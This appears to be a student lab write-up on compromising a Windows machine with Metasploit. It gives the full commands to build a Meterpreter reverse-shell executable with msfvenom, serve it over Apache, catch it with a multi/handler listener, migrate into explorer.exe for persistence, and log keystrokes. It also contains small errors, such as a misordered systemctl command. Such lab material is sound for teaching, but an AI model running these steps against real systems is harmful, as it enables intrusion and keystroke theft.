# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![Screenshot 2025-04-20 222050](https://github.com/user-attachments/assets/dc5487b6-87bb-4ace-aeba-d54ab96bd144)






Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![Screenshot 2025-04-20 222141](https://github.com/user-attachments/assets/a9615d8a-23f9-4103-8af5-6803a7f4ec51)








copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/user-attachments/assets/ff975434-41a9-4fe6-ae0c-2f71156fbeb8)





Start apache server
sudo systemctl apache2 start

![Screenshot 2025-04-20 222717](https://github.com/user-attachments/assets/b99d3a92-19f4-4b40-9cd1-c0344effb158)








Check the status of apache2

![Screenshot 2025-04-20 222806](https://github.com/user-attachments/assets/87a62d57-8b80-4337-85d8-76eab8de74cc)






Invoke msfconsole:
## OUTPUT:






Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![Screenshot 2025-04-07 114636](https://github.com/user-attachments/assets/b03d96a2-1d8d-4dec-8a0f-22c7cec2b903)




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![Screenshot 2025-04-11 141549](https://github.com/user-attachments/assets/1280db57-07f0-4f80-8c79-d2915f41f8f3)




Bypass any warning boxes, double-click the file, and allow it to run.


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 






Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![Screenshot 2025-04-11 142118](https://github.com/user-attachments/assets/5e89add7-61d5-489a-9cca-d223c37acec4)





keyscan_dump	Shows the keystrokes captured so far
![Screenshot 2025-04-07 115015](https://github.com/user-attachments/assets/2cd42810-8016-4632-97ca-6ab56f11c012)





## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
